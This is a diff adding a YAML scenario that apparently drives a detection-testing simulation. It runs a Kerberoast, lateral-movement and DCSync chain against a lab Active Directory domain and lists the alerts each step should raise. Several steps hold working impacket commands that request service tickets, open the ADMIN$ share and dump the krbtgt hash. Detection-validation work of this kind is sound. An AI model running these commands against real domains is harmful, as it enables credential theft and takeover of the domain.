@@ -1,0 +1,155 @@
+scenario_id: SIM-MP-002
+name: "Kerberoast + Pass-the-Hash Lateral Movement — ITDR + EDR + NDR Stitch"
+version: "1.0"
+status: active
+
+plane: ANALYTICS
+detection_types:
+  - BIOC
+  - Analytics
+
+uc_ref: UCS-MP-02
+tc_ref: TC-MP-02
+uc_name: "Cross-Plane Incident Stitching"
+tc_name: "Identity Attack Chain - Credential Theft to Lateral Movement"
+
+mitre_tactic: "TA0006"
+mitre_tactic_name: "Credential Access"
+mitre_technique: "T1558.003"
+mitre_technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
+additional_techniques:
+  - technique: "T1550.002"
+    name: "Use Alternate Authentication Material: Pass the Hash"
+  - technique: "T1021.002"
+    name: "Remote Services: SMB/Windows Admin Shares"
+  - technique: "T1003.006"
+    name: "OS Credential Dumping: DCSync"
+
+threat_report: "Unit42 - Kerberoasting Attack Patterns"
+threat_report_url: "https://unit42.paloaltonetworks.com/active-directory-attack-paths/"
+
+execution_identity:
+  default: root
+  options:
+    - root
+
+push_supported: true
+pull_supported: true
+
+required_content:
+  - repo: "fortra/impacket"
+  - repo: "GhostPack/Rubeus"
+  - repo: "BloodHoundAD/SharpHound"
+
+infra_modules_needed:
+  - base
+  - itdr
+  - edr
+  - ndr
+
+external_tools:
+  - name: impacket
+    source: "https://github.com/fortra/impacket"
+    type: script
+    install_inline: false
+
+steps:
+  - id: step-01
+    name: "AD reconnaissance: enumerate service accounts with SPNs"
+    command: |
+      echo '[MP-002] ITDR: enumerate Kerberoast-vulnerable accounts';
+      DC_IP="${CORTEXSIM_DC_IP:-10.0.10.10}";
+      DOMAIN="${CORTEXSIM_DOMAIN:-cortexsim.local}";
+      ADMIN_PWD="${CORTEXSIM_ADMIN_PWD:-PlaceholderForDemo}";
+      echo "[*] Target: $DOMAIN via $DC_IP";
+      impacket-GetUserSPNs "$DOMAIN/Administrator:$ADMIN_PWD" -dc-ip "$DC_IP" -request 2>&1 | head -20 || echo '[*] demo-mode: impacket not configured';
+      echo '[*] ITDR should flag LDAP sweep querying servicePrincipalName attribute'
+    identity: root
+    mitre_technique: "T1558.003"
+    expected_detections:
+      - plane: ITDR
+        type: BIOC
+        description: "ITDR - LDAP search filter (servicePrincipalName=*) from non-typical host"
+      - plane: ITDR
+        type: Analytics
+        description: "ITDR - Kerberos TGS-REQ flood from single source targeting multiple SPNs"
+      - plane: NDR
+        type: Analytics
+        description: "NGFW - Kerberos (port 88) traffic spike from attacker host"
+
+  - id: step-02
+    name: "Crack roasted hash (simulated offline)"
+    command: |
+      echo '[MP-002] Offline: hashcat crack simulation';
+      echo 'Successful crack - sql-svc:Summer2024' > /tmp/cortexsim_mp002_cracked.txt;
+      cat /tmp/cortexsim_mp002_cracked.txt;
+      echo '[*] Simulated only - no actual cracking performed'
+    identity: root
+    mitre_technique: "T1110.002"
+    expected_detections:
+      - plane: ANALYTICS
+        type: Analytics
+        description: "XSIAM - MTTD clock: time-gap between Kerberoast (step-01) and lateral auth (step-03) = stitched attack timeline"
+
+  - id: step-03
+    name: "Use cracked credential for lateral SMB access"
+    command: |
+      echo '[MP-002] EDR+NDR: Pass-the-Hash to workstation via SMB';
+      DC_IP="${CORTEXSIM_DC_IP:-10.0.10.10}";
+      WS_IP="${CORTEXSIM_WS_IP:-10.0.10.20}";
+      DOMAIN="${CORTEXSIM_DOMAIN:-cortexsim.local}";
+      impacket-smbclient "$DOMAIN/sql-svc:Summer2024@$WS_IP" -c "ls \\\\ADMIN\$" 2>&1 | head -10 || echo '[*] demo-mode';
+      echo '[*] Detections fire at multiple planes simultaneously'
+    identity: root
+    mitre_technique: "T1021.002"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "XDR (workstation) - sql-svc account authenticated remotely via SMB from non-typical host"
+      - plane: NDR
+        type: Analytics
+        description: "NGFW - SMB (port 445) session from attack endpoint to workstation subnet"
+      - plane: ITDR
+        type: BIOC
+        description: "ITDR - service account used interactively (normally machine-only context)"
+      - plane: ANALYTICS
+        type: Analytics
+        description: "XSIAM stitching - same user+hash observed on DC auth logs + NGFW SMB session + XDR remote login = single lateral movement incident"
+
+  - id: step-04
+    name: "DCSync attempt for full credential dump"
+    command: |
+      echo '[MP-002] ITDR peak: DCSync to extract krbtgt hash';
+      DC_IP="${CORTEXSIM_DC_IP:-10.0.10.10}";
+      DOMAIN="${CORTEXSIM_DOMAIN:-cortexsim.local}";
+      impacket-secretsdump -just-dc-user krbtgt "$DOMAIN/sql-svc:Summer2024@$DC_IP" 2>&1 | head -5 || echo '[*] demo-mode';
+      echo '[*] DCSync replication triggers high-severity ITDR alert'
+    identity: root
+    mitre_technique: "T1003.006"
+    expected_detections:
+      - plane: ITDR
+        type: BIOC
+        description: "ITDR - DCSync: DRSUAPI GetNCChanges from non-DC source, critical severity"
+      - plane: NDR
+        type: Analytics
+        description: "NGFW - DCE/RPC (port 135 + ephemeral) traffic to DC from attack endpoint"
+      - plane: ANALYTICS
+        type: Analytics
+        description: "XSIAM - full attack chain incident: recon -> Kerberoast -> PtH lateral -> DCSync, unified timeline"
+
+cleanup:
+  commands:
+    - "rm -f /tmp/cortexsim_mp002_cracked.txt"
+    - "echo '[CortexSim] SIM-MP-002 cleanup complete'"
+
+author: "Henry Reed"
+created: "2026-04-20"
+last_updated: "2026-04-20"
+tags:
+  - multi-plane
+  - stitching
+  - kerberoast
+  - pass-the-hash
+  - dcsync
+  - lateral-movement
+  - itdr-ndr-xdr-correlation
